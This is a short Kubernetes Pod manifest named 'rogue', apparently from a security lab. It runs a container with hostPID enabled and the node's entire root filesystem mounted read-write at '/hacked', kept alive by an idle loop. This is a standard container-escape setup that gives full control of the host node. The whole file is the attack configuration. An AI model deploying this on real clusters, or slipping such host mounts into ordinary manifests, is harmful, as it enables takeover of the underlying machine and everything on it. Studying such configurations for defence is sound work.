apiVersion: v1
kind: Pod
metadata:
  name: rogue
spec:
  hostPID: true
  containers:
  - name: rogue
    image: abigillu/playground:v1.1.0
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - name: host
      mountPath: /hacked

  volumes:
  - name: host
    hostPath:
      path: /
